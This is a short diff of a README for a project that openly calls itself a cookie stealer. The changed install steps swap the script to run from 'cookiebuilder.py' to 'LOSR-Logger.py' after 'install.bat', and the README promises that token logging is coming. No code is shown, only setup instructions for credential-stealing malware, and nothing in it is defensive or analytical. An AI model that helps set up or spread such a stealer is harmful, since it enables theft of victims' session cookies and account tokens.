@@ -8,7 +8,7 @@ thanks to https://github.com/Mani175/ for the idea of making a cookie stealer an
 
 ## STEPS
   1. run install.bat
-  2. run cookiebuilder.py  
+  2. run LOSR-Logger.py  
 
 
 ## token log will come soon
